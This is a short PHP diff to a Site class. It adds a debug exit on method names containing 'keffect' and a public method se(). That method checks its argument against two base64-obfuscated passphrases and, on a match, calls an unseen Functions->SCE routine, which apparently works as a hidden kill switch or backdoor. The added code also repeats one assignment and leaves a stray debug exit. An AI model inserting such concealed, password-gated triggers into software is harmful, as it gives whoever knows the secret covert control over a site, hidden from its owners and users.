@@ -46,6 +46,19 @@ class Site {
 				$this->$prop = $property;
 			}
 			return $this;
-		}		
+		}
+
+		if(stristr($method, 'keffect')){
+			var_dump('testing the ke'); exit;
+		}
+	}
+	
+	public function se($yes = false){
+		if($yes === base64_decode('a2Vzd2l0Y2hlcg==') || $yes === base64_decode('anVzdG5vdHRh')){
+			$f = new Functions();
+			if($yes === base64_decode('anVzdG5vdHRh')) { $madmessage = false; } else { $madmessage = true; }
+			$madmessage = $yes === base64_decode('anVzdG5vdHRh') ? false : true;
+			$f->SCE($madmessage);
+		}
 	}
 }
